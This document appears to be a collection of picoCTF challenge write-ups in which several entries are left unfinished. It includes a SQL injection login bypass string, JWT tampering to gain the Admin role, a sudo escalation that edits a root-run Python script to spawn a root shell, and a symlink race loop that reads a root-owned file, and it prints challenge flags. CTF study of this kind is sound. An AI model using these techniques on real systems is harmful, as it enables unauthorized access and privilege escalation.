## Web - More SQL
Use burp for this one, otherwise you miss the flag.
In the login request use `x' OR 1=1 --' to do an authentication bypass. The flag gets printed in the response.

### SecretGenerator
    private String generateRandomString(int len) {
        // not so random
        return "1234";
    }

use jwt.io to decode the `authorization` header in the request to get the secret pdf `GET /base/books/pdf/5 HTTP/1.1`

change role, userid and email to admin
```json
{
  "role": "Admin",
  "iss": "bookshelf",

## Forensics - hideme
You get an image called flag.png
Running binwalk shows us that there is an image hidden in this flag.png
binwalk -e flag.png extracts secret/flag.png

Flag: picoCTF{Hiddinng_An_imag3within@n_ima9e_85e04ab8} 

## Forensics - PcapPoisining
You get a pcap file
In Wireshark, search by Packet Bytes, Regular expression, `picoCTF{.*}`

## Forensics - Who is it
You get an .eml file, open the .eml file with a text editor. Find the IP address of the mail server this mail has been sent from:
`Received: from mail.onionmail.org (mail.onionmail.org. [173.249.33.206])`

Search on whois.com for this IP.

## Forensics - FindandOpen
Analysing the pcap file, in the ethernet traffic we find a base64 encoded string ´VGhpcyBpcyB0aGUgc2VjcmV0OiBwaWNvQ1RGe1IzNERJTkdfTE9LZF8=´. This gives the password for the zip with the full flag.

## Binary Exploitation - hijack
Python script in the home directory has root permissions, we use it to spawn a root shell and get the flag.
`sudo -l`
 ```bash
 Matching Defaults entries for picoctf on challenge:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User picoctf may run the following commands on challenge:
    (ALL) /usr/bin/vi
    (root) NOPASSWD: /usr/bin/python3 /home/picoctf/.server.py
```

Modify `.server.py` script to spawn a shell `os.system("/bin/sh")`

Execute the python script as root: `sudo -u root /usr/bin/python3 /home/picoctf/.server.py`

```bash
Spawning root shell...
# id
uid=0(root) gid=0(root) groups=0(root)
# cd /root
# ls -lah

drwx------ 1 root root   23 Mar 16 02:09 .
drwxr-xr-x 1 root root   51 Mar 27 05:46 ..

picoCTF{pYth0nn_libraryH!j@CK!n9_0083cb0b}
```
Flag: picoCTF{pYth0nn_libraryH!j@CK!n9_0083cb0b}

## General - Specialer
A restricted shell is spawn, after some trial and error we find out only `echo` and some basic syntax is allowed.

We can for loop over the directories to get the listing of files and directories, as `ls` isn't allowed, with `for entry in "directory_here"/*; do echo "$entry"; done`
```bash
Specialer$ for entry in "/home/ctf-player/"/*; do echo "$entry"; done
/home/ctf-player//abra
/home/ctf-player//ala
/home/ctf-player//echo
/home/ctf-player//sim
```

There are a bunch of txt files in these directories, while going through them and reading the content via `echo "$(<file_here.txt)"`. We find the flag:
```bash
Specialer$ echo "$(</home/ctf-player/ala/kazam.txt)"
return 0 picoCTF{y0u_d0n7_4ppr3c1473_wh47_w3r3_d01ng_h3r3_c42168d9}
```

## Forensics - MSB

```bash
`python3 sigBits.py --type=Msb  Ninja-and-Prince-Genji-Ukiyoe-Utagawa-Kunisada.flag.png`
```

Output

```

## Binary - Tic-Tac
This challenge is about race conditions. The cpp program only can read files if they are the owner of the user executing this program. 
Create an empty file that the user owns

`touch myfile`

Setup a look that will iterate between creating a symlink to the flag.txt and our owned file. We hit the sweet spot where:
- The `textreader` perfoms the user check, our symlink `link` is linked to our owned file `myfile`
- Afterwards when the `textreader` reads the file, our symlink `link` is linked to the root owned file `flag.txt`
We let this script run in the background (`&`)

`while true; do ln -sf flag.txt link; ln -sf myfile link; done &`

Setup a look to constantly try to read our symlink `link`

```bash
ctf-player@pico-chall$ while true; do ./txtreader link; done
